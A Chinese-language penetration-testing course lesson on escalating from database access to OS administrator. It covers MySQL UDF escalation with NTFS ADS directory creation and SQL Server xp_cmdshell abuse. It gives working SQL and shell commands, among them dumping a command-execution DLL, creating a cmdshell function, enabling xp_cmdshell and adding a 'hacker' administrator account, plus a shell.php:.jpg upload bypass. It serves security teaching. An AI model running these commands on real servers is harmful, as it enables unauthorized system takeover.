![](img/8310c3f13bc4514af935eb479f1908a7_1.png)

# 课程P76：第45天 - 数据库提权实战 🛡️

![](img/8310c3f13bc4514af935eb479f1908a7_3.png)

在本节课中，我们将要学习两种常见数据库（MySQL和SQL Server）的权限提升技术。通过利用数据库的特性或漏洞，我们可以将有限的数据库访问权限提升为操作系统的管理员权限。

---

![](img/8310c3f13bc4514af935eb479f1908a7_5.png)

## 概述 📋

![](img/8310c3f13bc4514af935eb479f1908a7_7.png)

![](img/8310c3f13bc4514af935eb479f1908a7_9.png)

前面的课程介绍了Windows系统下的权限提升方法。本节课将重点介绍数据库应用层面的提权技术。因为一个Web应用通常都会与数据库进行交互，并且可能存在SQL注入等漏洞。当我们通过Web漏洞获取Webshell后，如果服务器上存在数据库，我们就可以尝试利用数据库进行权限提升，从而获得服务器的更高控制权。

本节课内容主要分为三部分：MySQL提权、SQL Server提权。关于PostgreSQL的提权，我们将在后续课程中介绍。

![](img/8310c3f13bc4514af935eb479f1908a7_11.png)

![](img/8310c3f13bc4514af935eb479f1908a7_13.png)

![](img/8310c3f13bc4514af935eb479f1908a7_15.png)

![](img/8310c3f13bc4514af935eb479f1908a7_17.png)

---

![](img/8310c3f13bc4514af935eb479f1908a7_19.png)

![](img/8310c3f13bc4514af935eb479f1908a7_21.png)

![](img/8310c3f13bc4514af935eb479f1908a7_22.png)

![](img/8310c3f13bc4514af935eb479f1908a7_24.png)

![](img/8310c3f13bc4514af935eb479f1908a7_26.png)

![](img/8310c3f13bc4514af935eb479f1908a7_28.png)

![](img/8310c3f13bc4514af935eb479f1908a7_30.png)

![](img/8310c3f13bc4514af935eb479f1908a7_32.png)

## 第一部分：MySQL数据库提权 🗄️

![](img/8310c3f13bc4514af935eb479f1908a7_34.png)

![](img/8310c3f13bc4514af935eb479f1908a7_36.png)

关于MySQL数据库，大家应该都比较熟悉。在了解MySQL提权之前，我们需要先理解一个核心概念：UDF（用户定义函数）。

![](img/8310c3f13bc4514af935eb479f1908a7_38.png)

![](img/8310c3f13bc4514af935eb479f1908a7_40.png)

![](img/8310c3f13bc4514af935eb479f1908a7_42.png)

### 什么是UDF？

![](img/8310c3f13bc4514af935eb479f1908a7_44.png)

![](img/8310c3f13bc4514af935eb479f1908a7_46.png)

![](img/8310c3f13bc4514af935eb479f1908a7_48.png)

![](img/8310c3f13bc4514af935eb479f1908a7_50.png)

![](img/8310c3f13bc4514af935eb479f1908a7_52.png)

![](img/8310c3f13bc4514af935eb479f1908a7_54.png)

UDF是 **User Defined Function** 的缩写，意为用户定义函数。它的作用是为用户提供了一种高效创建自定义函数的方式。

![](img/8310c3f13bc4514af935eb479f1908a7_56.png)

![](img/8310c3f13bc4514af935eb479f1908a7_58.png)

![](img/8310c3f13bc4514af935eb479f1908a7_60.png)

![](img/8310c3f13bc4514af935eb479f1908a7_62.png)

![](img/8310c3f13bc4514af935eb479f1908a7_64.png)

![](img/8310c3f13bc4514af935eb479f1908a7_66.png)

具体方法是：我们可以编写一个能够调用系统命令的UDF动态链接库（DLL）文件。在Windows系统下，DLL（Dynamic Link Library）是动态链接库，其中存放着可供多个程序共享调用的代码和数据。我们可以通过调用DLL中的函数来实现特定功能。

![](img/8310c3f13bc4514af935eb479f1908a7_68.png)

![](img/8310c3f13bc4514af935eb479f1908a7_69.png)

![](img/8310c3f13bc4514af935eb479f1908a7_71.png)

![](img/8310c3f13bc4514af935eb479f1908a7_73.png)

![](img/8310c3f13bc4514af935eb479f1908a7_75.png)

![](img/8310c3f13bc4514af935eb479f1908a7_77.png)

在MySQL中，它支持用户自定义函数。在Windows系统下，要创建自定义函数，我们可以通过编写一个包含UDF函数的DLL文件来实现。我们只需要有这个DLL文件，就能利用它来创建一个用户自定义函数。这个函数的功能就是用来调用系统的cmd命令（在Linux上则是调用shell命令）。因此，我们在数据库查询时，可以通过调用这个函数来执行系统命令，从而达到提权的目的。

![](img/8310c3f13bc4514af935eb479f1908a7_79.png)

**需要注意**：不同版本下，UDF的DLL文件存放位置不同。
*   在Windows Server 2003及MySQL 5.1版本之前，DLL文件存放在 `C:\Windows\` 目录下。
*   在MySQL 5.1及之后版本，DLL文件存放在MySQL安装目录下的 `lib\plugin` 目录中。

我们的DLL文件必须放在指定的目录下，MySQL才能在调用时找到并利用它来创建函数。

![](img/8310c3f13bc4514af935eb479f1908a7_81.png)

### 关键技术：NTFS ADS流创建目录

![](img/8310c3f13bc4514af935eb479f1908a7_83.png)

在我们的UDF提权过程中，需要将DLL文件导出到MySQL安装目录的 `lib\plugin` 下。但很多时候，目标MySQL的安装目录下可能不存在 `lib` 或 `plugin` 目录。而且，MySQL的文件操作不能直接创建目录（`SELECT ... INTO OUTFILE` 只能导出数据为文件，不能创建目录）。

这时，我们就需要利用NTFS文件系统的**交换数据流（Alternate Data Streams, ADS）**特性来创建目录。

![](img/8310c3f13bc4514af935eb479f1908a7_85.png)

ADS是NTFS文件系统的一个特性，其格式为：`文件名:流名:流种类`。其中流名可以省略。

![](img/8310c3f13bc4514af935eb479f1908a7_87.png)

![](img/8310c3f13bc4514af935eb479f1908a7_89.png)

![](img/8310c3f13bc4514af935eb479f1908a7_91.png)

我们常见的文件数据流是 `$DATA` 流。当流种类为 `$INDEX_ALLOCATION` 时，表示这个数据流对应的是一个**文件夹（目录）**。

![](img/8310c3f13bc4514af935eb479f1908a7_93.png)

![](img/8310c3f13bc4514af935eb479f1908a7_95.png)

![](img/8310c3f13bc4514af935eb479f1908a7_97.png)

![](img/8310c3f13bc4514af935eb479f1908a7_99.png)

因此，我们可以通过MySQL导出数据到这样一个“文件”，实际创建一个目录。

**理解示例**：
在命令行中，我们可以这样操作：
1.  创建普通文件：`echo "content" > test.txt`
2.  创建ADS流文件：`echo "hidden content" > test.txt:secret.txt`。这样会在 `test.txt` 文件下创建一个名为 `secret.txt` 的隐藏数据流，用记事本打开 `test.txt:secret.txt` 可以看到内容，但直接打开 `test.txt` 看不到。
3.  创建目录（利用ADS）：`echo. > testDir::$INDEX_ALLOCATION`。执行后，虽然可能报错，但会创建一个名为 `testDir` 的文件夹。

![](img/8310c3f13bc4514af935eb479f1908a7_101.png)

![](img/8310c3f13bc4514af935eb479f1908a7_103.png)

![](img/8310c3f13bc4514af935eb479f1908a7_105.png)

**应用场景**：这个技术在Web安全文件上传绕过中也有应用，通过上传类似 `shell.php:.jpg` 的文件名，在某些Windows服务器上实际会生成 `shell.php` 文件。

所以，在MySQL提权中，如果目标不存在 `lib\plugin` 目录，我们可以分两步创建：
1.  创建 `lib` 目录。
2.  在 `lib` 目录下创建 `plugin` 目录。

### MySQL UDF提权实战流程

![](img/8310c3f13bc4514af935eb479f1908a7_107.png)

接下来，我们通过一个实验来详细讲解MySQL UDF提权的步骤。提权的大体思路如下：

![](img/8310c3f13bc4514af935eb479f1908a7_109.png)

![](img/8310c3f13bc4514af935eb479f1908a7_110.png)

**场景假设**：目标主机开启了MySQL远程连接，并且我们通过某种方式（如查看网站配置文件）获得了数据库的用户名和密码。

![](img/8310c3f13bc4514af935eb479f1908a7_112.png)

![](img/8310c3f13bc4514af935eb479f1908a7_114.png)

**核心步骤**：
1.  **信息收集**：确认MySQL版本、安装路径，判断 `lib\plugin` 目录是否存在。
2.  **准备UDF DLL**：将提权用的DLL文件转换为十六进制格式。
3.  **操作数据库**：
    *   在数据库中创建一个临时表，用于存放DLL的二进制数据。
    *   将DLL的十六进制数据插入到这个临时表中。
    *   利用 `SELECT ... INTO DUMPFILE` 语句，将临时表中的DLL数据导出到目标服务器的 `lib\plugin` 目录下（如果目录不存在，需先用ADS流技术创建）。
4.  **创建UDF函数**：在MySQL中，利用导出的DLL文件创建一个自定义函数（例如函数名为 `cmdshell`）。
5.  **执行系统命令**：通过调用这个自定义函数来执行系统命令（如添加管理员用户），从而实现权限提升。

![](img/8310c3f13bc4514af935eb479f1908a7_116.png)

![](img/8310c3f13bc4514af935eb479f1908a7_118.png)

![](img/8310c3f13bc4514af935eb479f1908a7_120.png)

![](img/8310c3f13bc4514af935eb479f1908a7_122.png)

**具体操作语句示例**：
1.  查看MySQL安装目录：`SELECT @@basedir;`
2.  创建临时表：
    ```sql
    CREATE TABLE temp_udf (udf LONGBLOB);
    ```
3.  插入DLL数据（假设 `{HEX_CODE}` 是DLL的十六进制内容）：
    ```sql
    INSERT INTO temp_udf (udf) VALUES (UNHEX('{HEX_CODE}'));
    ```
4.  导出DLL文件（假设安装目录为 `C:/mysql/`）：
    ```sql
    SELECT udf FROM temp_udf INTO DUMPFILE 'C:/mysql/lib/plugin/udf.dll';
    ```
5.  创建UDF函数：
    ```sql
    CREATE FUNCTION cmdshell RETURNS STRING SONAME 'udf.dll';
    ```
6.  执行系统命令：
    ```sql
    SELECT cmdshell('net user hacker Password123! /add');
    SELECT cmdshell('net localgroup administrators hacker /add');
    ```

**另一种场景**：如果已经获得Webshell但无法执行系统命令，可以上传集成了上述步骤的提权脚本，通过Web界面填写数据库信息来完成提权。

---

![](img/8310c3f13bc4514af935eb479f1908a7_124.png)

![](img/8310c3f13bc4514af935eb479f1908a7_126.png)

![](img/8310c3f13bc4514af935eb479f1908a7_128.png)

![](img/8310c3f13bc4514af935eb479f1908a7_130.png)

![](img/8310c3f13bc4514af935eb479f1908a7_132.png)

## 第二部分：SQL Server数据库提权 🗃️

![](img/8310c3f13bc4514af935eb479f1908a7_134.png)

![](img/8310c3f13bc4514af935eb479f1908a7_136.png)

![](img/8310c3f13bc4514af935eb479f1908a7_137.png)

![](img/8310c3f13bc4514af935eb479f1908a7_139.png)

![](img/8310c3f13bc4514af935eb479f1908a7_141.png)

![](img/8310c3f13bc4514af935eb479f1908a7_142.png)

SQL Server是Windows服务器上常用的数据库。其提权主要利用一个名为 `xp_cmdshell` 的扩展存储过程。

### 什么是xp_cmdshell？

![](img/8310c3f13bc4514af935eb479f1908a7_144.png)

![](img/8310c3f13bc4514af935eb479f1908a7_146.png)

`xp_cmdshell` 是SQL Server的一个扩展存储过程。它允许系统管理员以操作系统命令行解释器的方式执行给定的命令字符串，并以文本行的方式返回任何输出。

![](img/8310c3f13bc4514af935eb479f1908a7_148.png)

由于它可以执行任何操作系统命令，因此危害很大。如果攻击者获得了SQL Server的管理员账号（如sa），连接到数据库后就可以利用 `xp_cmdshell` 执行系统命令，从而获得系统权限。

![](img/8310c3f13bc4514af935eb479f1908a7_150.png)

**版本差异**：
*   在SQL Server 2000中，`xp_cmdshell` 默认是开启的。
*   在SQL Server 2005及更高版本中，`xp_cmdshell` 默认是**关闭**的。

![](img/8310c3f13bc4514af935eb479f1908a7_152.png)

![](img/8310c3f13bc4514af935eb479f1908a7_154.png)

![](img/8310c3f13bc4514af935eb479f1908a7_156.png)

因此，在新版本中我们无法直接使用它。如果执行 `xp_cmdshell` 相关命令报错，通常意味着该组件被禁用。

![](img/8310c3f13bc4514af935eb479f1908a7_158.png)

![](img/8310c3f13bc4514af935eb479f1908a7_160.png)

![](img/8310c3f13bc4514af935eb479f1908a7_162.png)

![](img/8310c3f13bc4514af935eb479f1908a7_164.png)

### SQL Server提权实战流程

![](img/8310c3f13bc4514af935eb479f1908a7_166.png)

![](img/8310c3f13bc4514af935eb479f1908a7_168.png)

![](img/8310c3f13bc4514af935eb479f1908a7_170.png)

![](img/8310c3f13bc4514af935eb479f1908a7_172.png)

![](img/8310c3f13bc4514af935eb479f1908a7_174.png)

![](img/8310c3f13bc4514af935eb479f1908a7_176.png)

**场景假设**：我们通过一个SQL注入点，能够执行我们注入的SQL语句，并且当前数据库用户具有较高权限（如属于 `sysadmin` 服务器角色）。

![](img/8310c3f13bc4514af935eb479f1908a7_178.png)

**核心步骤**：
1.  **判断当前用户权限**：确认当前数据库用户是否属于 `sysadmin` 角色（即管理员组）。
    ```sql
    SELECT IS_SRVROLEMEMBER('sysadmin');
    -- 如果返回1，则是管理员。
    ```
2.  **判断xp_cmdshell是否存在**：检查数据库是否安装了 `xp_cmdshell` 组件。
    ```sql
    SELECT count(*) FROM master.dbo.sysobjects WHERE xtype='X' AND name='xp_cmdshell';
    ```
3.  **启用xp_cmdshell（如果需要）**：如果组件存在但被禁用，且当前是管理员权限，则可以尝试启用它。
    ```sql
    EXEC sp_configure 'show advanced options', 1;
    RECONFIGURE;
    EXEC sp_configure 'xp_cmdshell', 1;
    RECONFIGURE;
    ```
4.  **执行系统命令**：启用后，即可通过 `xp_cmdshell` 执行系统命令。
    ```sql
    EXEC master..xp_cmdshell 'whoami';
    EXEC master..xp_cmdshell 'net user hacker Password123! /add';
    EXEC master..xp_cmdshell 'net localgroup administrators hacker /add';
    ```
5.  **获取命令输出**：`xp_cmdshell` 的执行结果会以数据行的形式返回。在某些注入点，可能需要结合其他语句来查看输出。

**备用方案**：如果 `xp_cmdshell` 被删除或无法启用，可以尝试利用其他扩展存储过程，如 `sp_OACreate` 等，通过创建COM对象来执行命令或写入文件。

---

![](img/8310c3f13bc4514af935eb479f1908a7_180.png)

![](img/8310c3f13bc4514af935eb479f1908a7_181.png)

## 总结 🎯

![](img/8310c3f13bc4514af935eb479f1908a7_183.png)

![](img/8310c3f13bc4514af935eb479f1908a7_185.png)

本节课我们一起学习了两种主流数据库的权限提升技术：

![](img/8310c3f13bc4514af935eb479f1908a7_187.png)

1.  **MySQL UDF提权**：核心在于利用用户自定义函数功能，通过上传自定义的DLL文件来创建一个能执行系统命令的函数。关键技术点包括理解UDF、掌握NTFS ADS流创建目录的方法，以及熟悉整个手工提权的SQL操作流程。
2.  **SQL Server xp_cmdshell提权**：核心在于利用 `xp_cmdshell` 扩展存储过程来执行系统命令。关键在于判断当前用户权限、确认组件状态，并在必要时以管理员权限启用它。

![](img/8310c3f13bc4514af935eb479f1908a7_189.png)

![](img/8310c3f13bc4514af935eb479f1908a7_191.png)

这两种提权方式的前提都是我们已经获得了数据库的连接凭证（用户名和密码），并且数据库服务运行在具有一定权限的账户下（如SYSTEM或Administrator）。在实际渗透测试中，这些信息往往通过Web漏洞、配置信息泄露等方式获得。

![](img/8310c3f13bc4514af935eb479f1908a7_193.png)

理解这些原理和步骤，有助于我们在合适的场景下利用数据库这一跳板，成功提升权限，深入目标网络。